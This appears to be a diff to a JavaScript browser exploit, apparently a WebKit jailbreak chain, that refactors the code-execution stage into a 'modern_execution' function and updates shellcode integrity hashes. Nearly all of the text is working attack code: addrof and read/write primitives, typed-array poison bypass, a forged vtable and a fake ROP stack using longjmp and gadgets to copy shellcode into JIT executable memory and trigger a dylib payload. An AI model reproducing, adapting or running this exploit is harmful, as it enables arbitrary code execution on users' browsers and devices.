@@ -11,8 +11,8 @@
 
 using('verbosity');
 
+//Configuration
 var INTEGRITY_CHECKS = false; //enable this if you want to check the shellcode for integrity.
-
 var UNITY = {
     TEN: 10,
     HUNDRED: 100,
@@ -20,19 +20,20 @@ var UNITY = {
     MILLION: 1000000,
     BILLION: 1000000000
 };
-
-_off = {};
-
 ITERS = UNITY.TEN * UNITY.THOUSAND;
 ALLOCS = UNITY.THOUSAND;
 counter = 0;
 
+//offsets
+_off = {};
+
+//Casting and types
 var conversion_buffer = new ArrayBuffer(8);
 var f64 = new Float64Array(conversion_buffer);
 var i32 = new Uint32Array(conversion_buffer);
 var BASE32 = 0x100000000;
 
-
+//Initialisation of globals
 var workbuf = new ArrayBuffer(0x1000000)
 var u32_buffer = new Uint32Array(workbuf);
 var u8_buffer = new Uint8Array(workbuf);
@@ -99,8 +100,10 @@ function trigger(constr, modify, res, val) {
     `)
 }
 
+
 //The exploit
 var pwn = function() {
+
     _off = window.chosendevice.offsets;
     console.log('Starting stage 1...');
     
@@ -187,9 +190,6 @@ var pwn = function() {
         p2: manager,
         p3: 0xfffffff, // Butterfly indexing mask
     };
-    
-
-    if(verbosity === VERBOSITY.VERBOSE) print("Using padding: "+hex(FPO+0x8));
     
     var fake_addr = stage1.addrof(outer) +FPO+0x8;
     
@@ -284,6 +284,8 @@ var pwn = function() {
     }
 
     stage2.test();
+
+
     if(verbosity === VERBOSITY.VERBOSE) print("Stage 2 test succeeded, continueing...");
     
     var wrapper = document.createElement('div');
@@ -338,77 +340,93 @@ var pwn = function() {
         + '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
         + '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy)
     );
+ 
+    //logic for older devices, credit goes to @idiidk
+    function legacy_execution() {
+        
+        //See ExecutableAllocator.cpp on webkit
+        //jitWriteSeperateHeapsFunc
+    }
+
+    function modern_execution() {
+        
+        //Now set up our shellcode for code execution
+        var callback_vector = stage2.read64(callbacks);
+        var poison = stage2.read64(g_typedArrayPoisons + 6*8);
+        var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);
+
+        var shellcode_src = buffer_addr + 0x4000;
+        var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
+
+        if (shellcode_dst < startOfFixedExecutableMemoryPool) {
+            fail(4);
+        }
+
+        stage2.write64(shellcode_src + 4, dlsym);
+                  
+        //set up our fake executable stack
+        var fake_stack = [
+            0,
+            shellcode_length,  // x2
+            0,
+            
+            pop_x8,
+            
+            0, 0, 0, 0, 0,
+            shellcode_dst, // x8
+            0, 0, 0, 0,
+            stage2.read64(ptr_stack_check_guard) + 0x58,
+            
+            linkcode_gadget,
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+            
+            shellcode_dst
+        ];
+                  
+        // Set up fake vtable at offset 0
+        u32_buffer[0] = longjmp % BASE32;
+        u32_buffer[1] = longjmp / BASE32;
+
+        // Set up fake stack at offset 0x2000
+        for (var i = 0; i < fake_stack.length; ++i) {
+              u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
+              u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
+        }
+        
+        //lets set up our code execution of the dylib payload
+        stage2.write_non_zero(el_addr, [
+            buffer_addr, // fake vtable
+            0,
+            shellcode_src, // x21
+            0, 0, 0, 0, 0, 0, 0,
+            0, // fp
+
+            pop_x2, // lr
+            0,
+            buffer_addr + 0x2000, // sp
+        ]);
+        if (hex(stage2.read64(el_addr + 16)) === hex(shellcode_src)) {
+            print('shellcode is at: ' + hex(shellcode_dst));
+        } else {
+            fail('Failed writing shellcode');
+            return false;
+        }
+    }
 
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
-        // Probably an older phone, should be even easier
-        //fail(3);
-    }
-    
-    if(verbosity === VERBOSITY.VERBOSE) print("Setting up shellcode in memory...");
-
-    //Now set up our shellcode for code execution
-    var callback_vector = stage2.read64(callbacks);
-
-    var poison = stage2.read64(g_typedArrayPoisons + 6*8);
-    var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);
-
-    var shellcode_src = buffer_addr + 0x4000;
-    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
-
-    if (shellcode_dst < startOfFixedExecutableMemoryPool) {
-        fail(4);
+       //legacy_execution();
+        modern_execution(); //just for fun
+    } else {
+        modern_execution();
     }
 
-    stage2.write64(shellcode_src + 4, dlsym);
-              
-    //set up our fake executable stack
-    var fake_stack = [
-        0,
-        shellcode_length,  // x2
-        0,
-        
-        pop_x8,
-        
-        0, 0, 0, 0, 0,
-        shellcode_dst, // x8
-        0, 0, 0, 0,
-        stage2.read64(ptr_stack_check_guard) + 0x58,
-        
-        linkcode_gadget,
-        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-        
-        shellcode_dst
-    ];
-              
-    // Set up fake vtable at offset 0
-    u32_buffer[0] = longjmp % BASE32;
-    u32_buffer[1] = longjmp / BASE32;
-
-    // Set up fake stack at offset 0x2000
-    for (var i = 0; i < fake_stack.length; ++i) {
-          u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
-          u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
-    }
-    
-    //lets set up our code execution of the dylib payload
-    stage2.write_non_zero(el_addr, [
-        buffer_addr, // fake vtable
-        0,
-        shellcode_src, // x21
-        0, 0, 0, 0, 0, 0, 0,
-        0, // fp
-
-        pop_x2, // lr
-        0,
-        buffer_addr + 0x2000, // sp
-    ]);
-
-    //if(verbosity >= VERBOSITY.HIGH) print('shellcode is at ' + hex(shellcode_dst));
-    if(verbosity >= VERBOSITY.DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');
+    if(verbosity >= VERBOSITY.DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');    
     wrapper.addEventListener('click', function(){}); //execute the shellcode
+    return true;
 };
+
 
 function integrity_checks(buffer) {
     if(INTEGRITY_CHECKS) {
@@ -422,11 +440,11 @@ function integrity_checks(buffer) {
         };
         
         if(
-            shellcode_hashes.md5 !== "5b8d489beb89a7515dc7fb5ee2f4092d" || 
-            shellcode_hashes.sha1 !== "5d97f3843c1a3b88c7a95dae803b46e07a67d3ed" ||
-            shellcode_hashes.sha256 !== "a4a3254bc86d5b2030c0637173b927a489b98d1d29fcfcc8232636eec94a2fe8" ||
-            shellcode_hashes.sha384 !== "78791343c427ddd51c1bc236f77bafc4cfef04796f931d856e6652aadedb5ab54e46fe9b05e98ce7dc982eba9f1c6220" ||
-            shellcode_hashes.sha512 !== "ef48614b78b42be7bedb79a7aa768eb19ad8fb05cefac2d68c8d74ab6a95d77aa1054d255294b5bf7e9ece648ac916fa8999e79aa93a707732b9850418bd0053"
+            shellcode_hashes.md5 !== "4a7cb4df072782a2a0273593b96f5278" || 
+            shellcode_hashes.sha1 !== "1fdbc8b15b25819eb8403e402ca7f32f489ff01d" ||
+            shellcode_hashes.sha256 !== "2d3d35db971e0697aaacc56ffc2af2967609f3c016a9de180b2ba9a4adbb74d0" ||
+            shellcode_hashes.sha384 !== "f277af627fceec928b6579ac67c8173abde382ed836f13416a1c3e215d3928cd79bcbd53b9b7fef2188a5afeec80034c" ||
+            shellcode_hashes.sha512 !== "e4c01d654f1f33002da2033c8eb9509e7fb2f5275d7fc4dfd49fd420cf76da6b3b712df4e0c35e51e66c9c5249a3c7146c14e01242db77673a747e73ef649bdc"
         ) throw new Error('Shellcode integrity check failed.');
     }
 }
